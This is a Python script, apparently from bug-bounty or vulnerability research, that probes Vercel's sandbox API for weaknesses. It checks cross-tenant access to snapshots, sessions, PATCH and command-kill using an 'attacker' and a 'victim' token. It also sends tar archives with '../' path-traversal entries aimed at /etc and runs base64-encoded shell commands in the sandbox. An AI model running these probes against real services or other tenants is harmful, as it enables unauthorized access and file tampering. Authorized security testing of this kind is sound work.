# -*- coding: utf-8 -*-
"""SDK 端点补测 (v46b)
P1: interactive 返回 + interactivePort 探究
P2: listSnapshots 跨租户 (project=victim)
P3: listSessions 跨租户
P4: PATCH 跨租户
P5: fs/write 正确 x-cwd (/tmp) + ../ 路径遍历
P6: cmd kill / cmdId 查询 / logs
P7: fork 的数据复制验证 (fork 后读源 sandbox 文件)"""
import base64, io, json, sys, tarfile, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

NAME = 'sdk46b'
TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')

def api_raw(method, path, body=None, ctype='application/json', headers=None, tok=None, timeout=120):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + (tok or TOKEN))
    if ctype:
        req.add_header('Content-Type', ctype)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    data = body if isinstance(body, bytes) else (json.dumps(body).encode() if body is not None else None)
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:700]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:700]
    except Exception as e:
        return -1, 'EXC %s' % e

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    return json.loads(r)['sandbox']['currentSessionId']

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def gzip_tar(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
        for name, content, mode in files:
            ti = tarfile.TarInfo(name)
            ti.size = len(content)
            ti.mode = mode or 0o644
            ti.mtime = int(time.time())
            tf.addfile(ti, io.BytesIO(content))
    return buf.getvalue()

if __name__ == '__main__':
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(10)

    print('=== P1: interactive ===', flush=True)
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/interactive?teamId=%s' % (sid, TEAM), {})
    print('[interactive] -> %d %s' % (c, (r or '')[:500]), flush=True)
    # 看 session 的 interactivePort
    c2, r2 = api_raw('GET', '/v2/sandboxes/sessions/%s?teamId=%s' % (sid, TEAM))
    print('[session] -> %d %s' % (c2, (r2 or '')[:500]), flush=True)

    print('=== P2: listSnapshots 跨租户 ===', flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/snapshots?teamId=%s&project=%s&limit=5' % (TEAM_V, PROJ_V), tok=TOK_V)
    print('[victim list own] -> %d %s' % (c, (r or '')[:200]), flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/snapshots?teamId=%s&project=%s&limit=5' % (TEAM, PROJ_V))
    print('[attacker list victim proj] -> %d %s' % (c, (r or '')[:200]), flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/snapshots?teamId=%s&project=%s&limit=5' % (TEAM, PROJ), tok=TOK_V)
    print('[victim list attacker proj] -> %d %s' % (c, (r or '')[:200]), flush=True)

    print('=== P3: listSessions 跨租户 ===', flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/sessions?teamId=%s&project=%s&limit=5' % (TEAM, PROJ_V))
    print('[attacker list victim sessions] -> %d %s' % (c, (r or '')[:200]), flush=True)
    c, r = api_raw('GET', '/v2/sandboxes/sessions?teamId=%s&project=%s&limit=5' % (TEAM_V, PROJ_V), tok=TOK_V)
    print('[victim list own sessions] -> %d %s' % (c, (r or '')[:200]), flush=True)

    print('=== P4: PATCH 跨租户 ===', flush=True)
    c, r = api_raw('PATCH', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM_V, PROJ_V),
                   {"persistent": True}, tok=TOK_V, timeout=60)
    print('[victim PATCH] -> %d %s' % (c, (r or '')[:200]), flush=True)

    print('=== P5: fs/write x-cwd=/tmp + 遍历 ===', flush=True)
    gz = gzip_tar([('sdk_mark.txt', b'SDK_WRITE_42', 0o644)])
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/write?teamId=%s' % (sid, TEAM), gz,
                   ctype='application/gzip', headers={'x-cwd': '/tmp'})
    print('[write /tmp] -> %d %s' % (c, (r or '')[:200]), flush=True)
    gz2 = gzip_tar([('../../etc/sdk_escape2', b'ESCAPE_88', 0o644)])
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/write?teamId=%s' % (sid, TEAM), gz2,
                   ctype='application/gzip', headers={'x-cwd': '/tmp'})
    print('[write /tmp ../] -> %d %s' % (c, (r or '')[:200]), flush=True)
    gz3 = gzip_tar([('..%2F..%2Fetc%2Fsdk_escape3', b'ESCAPE_99', 0o644)])
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/fs/write?teamId=%s' % (sid, TEAM), gz3,
                   ctype='application/gzip', headers={'x-cwd': '/tmp'})
    print('[write /tmp enc ../] -> %d %s' % (c, (r or '')[:200]), flush=True)
    b64 = base64.b64encode(b'ls -la /tmp/sdk_mark* /etc/sdk_escape* 2>&1').decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=25000)
    print('[verify] %s' % parse_data(r).strip()[:200], flush=True)

    print('=== P6: cmdId/kill/logs ===', flush=True)
    c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
                   {"command": "sleep", "args": ["30"], "wait": False})
    print('[cmd async] -> %d %s' % (c, (r or '')[:200]), flush=True)
    cmd_id = None
    try:
        cmd_id = json.loads(r)['command']['id']
        print('cmdId =', cmd_id, flush=True)
    except Exception:
        pass
    if cmd_id:
        c, r = api_raw('GET', '/v2/sandboxes/sessions/%s/cmd/%s?teamId=%s' % (sid, cmd_id, TEAM))
        print('[get cmd] -> %d %s' % (c, (r or '')[:150]), flush=True)
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd/%s/kill?teamId=%s' % (sid, cmd_id, TEAM), {})
        print('[kill cmd] -> %d %s' % (c, (r or '')[:150]), flush=True)
        c, r = api_raw('GET', '/v2/sandboxes/sessions/%s/cmd/%s/logs?teamId=%s' % (sid, cmd_id, TEAM))
        print('[cmd logs] -> %d %s' % (c, (r or '')[:150]), flush=True)
        # 跨租户: victim kill attacker 的 cmdId
        c, r = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd/%s/kill?teamId=%s' % (sid, cmd_id, TEAM_V), {}, tok=TOK_V)
        print('[victim kill] -> %d %s' % (c, (r or '')[:150]), flush=True)

    print('=== P7: fork 数据复制 ===', flush=True)
    b64 = base64.b64encode(b'echo FORK_SOURCE_MARK > /tmp/fork_src.txt').decode()
    c, r = cmd(sid, 'sh', ['-c', 'echo %s | base64 -d | sh' % b64], timeout_ms=20000)
    print('[src mark] -> %d' % c, flush=True)
    time.sleep(2)
    c, r = api_raw('POST', '/v2/sandboxes/%s/fork?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ), {"name": NAME + 'f'}, timeout=120)
    print('[fork] -> %d %s' % (c, (r or '')[:150]), flush=True)
    if c == 200:
        time.sleep(10)
        fsid = json.loads(r)['sandbox']['currentSessionId']
        b64 = base64.b64encode(b'cat /tmp/fork_src.txt 2>&1; cat /vercel/sandbox/fs_marker.txt 2>&1').decode()
        c2, r2 = api_raw('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (fsid, TEAM),
                         {"command": "sh", "args": ["-c", 'echo %s | base64 -d | sh' % b64], "wait": True}, timeout=40000)
        out = ''
        for line in r2.splitlines():
            if '"data"' in line:
                try:
                    out += json.loads(line).get('data', '')
                except Exception:
                    pass
        print('[fork read] -> %d %s' % (c2, out.strip()[:150]), flush=True)
        api_raw('DELETE', '/v2/sandboxes/%sf?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
        print('  (fork cleaned)', flush=True)

    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
